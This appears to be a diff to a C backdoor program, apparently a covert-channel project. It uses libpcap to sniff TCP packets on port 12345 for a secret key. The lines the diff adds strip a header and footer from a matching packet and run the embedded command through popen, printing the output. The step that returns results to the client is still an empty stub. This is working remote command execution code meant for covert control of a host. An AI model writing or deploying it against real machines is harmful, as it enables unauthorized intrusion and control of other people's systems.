@@ -162,8 +162,6 @@ void server(struct server_opt s_opt){
     char filter_exp[] = "port 12345"; /* The filter expression */
     bpf_u_int32 mask;               /* Our netmask */
     bpf_u_int32 net;                /* Our IP */
-    struct pcap_pkthdr header;      /* The header that pcap gives us */
-    const u_char *packet;           /* The actual packet */
     
     // Get network interface
     dev = s_opt.device; //dev = "wlp4s5"; //dev = pcap_lookupdev(errbuf);
@@ -288,7 +286,7 @@ int send_datagram(struct addr_info *user_addr, char *data){
     memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
     psh.data = data;
     
-    tcph->check = csum((unsigned short*)&psh , sizeof(pseudo_header));
+    tcph->check = csum((unsigned short*)&psh, sizeof(pseudo_header));
  
     /* Build our own header */
     
@@ -305,7 +303,7 @@ int send_datagram(struct addr_info *user_addr, char *data){
         system_fatal("sendto");
         return -1;
     }
-    else{ //Data sent successfully
+    else{
         printf("Sent command!\n");
         return 0;
     }
@@ -330,18 +328,67 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
         perror("tcp_ip_typecast");
         return;
     }
+    printf("Payload (len:%zu): %s\n", strlen((char *)packet_info.payload), packet_info.payload);
     
-    printf("Test: %s\n", packet_info.payload);
+    /* Check the packet for the key meant for the backdoor */
     
-    /* Check the packet for the header key meant for the backdoor */
+    if(strncmp((char *)packet_info.payload, BD_KEY, BD_KEY_LEN) != 0){
+        printf("Not for backdoor, discard.\n");
+        return;
+    }
+    else
+        printf("Got message!\n");
     
     /* Decrypt remaining packet data */
     
-    /* Verify decryption succeeds by checking for custom header and footer */
+    // Copy message
+    u_char message[BD_MAX_MSG_LEN];
+    memset(message, 0, BD_MAX_MSG_LEN);
+    strcpy((char *)message, (char *)(packet_info.payload + BD_KEY_LEN));
+    printf("Message: %s\n", message);
+    
+    /* Verify decryption succeeds by checking for header and footer */
+    
+    u_char *bd_header = message;
+    u_char *bd_footer = message + strlen((char *)message) - BD_KEY_LEN;
+    
+    if(strncmp((char *)bd_header, BD_HEADER, BD_KEY_LEN) != 0 || \
+        strncmp((char *)bd_footer, BD_FOOTER, BD_KEY_LEN) != 0 ){
+        printf("Decryption failed, discard.\n");
+        return;
+    }
+    else
+        printf("Decryption success!\n");
     
     /* All checks successful, run the system command */
     
+    // Parse command
+    u_char bd_command[BD_MAX_MSG_LEN];
+    memset(bd_command, 0, BD_MAX_MSG_LEN);
+    strncpy((char *)bd_command, \
+        (char *)(message + BD_KEY_LEN), \
+        strlen((char *)message) - (2 * BD_KEY_LEN));
+    printf("Command: %s\n", bd_command);
+    
+    // Execute command
+    FILE *fp;
+    fp = popen((char *)bd_command, "r");
+    if(fp == NULL){
+        printf("Command error!\n");
+        return;
+    }
+    
+    char output[1024];
+    memset(output, 0, 1024);
+    while((fgets(output, 1024, fp) != NULL)){
+        printf("%s", output);
+    }
+    
+    pclose(fp);
+    
     /* Send results back to client */
+    
+    
 }
 
 /*
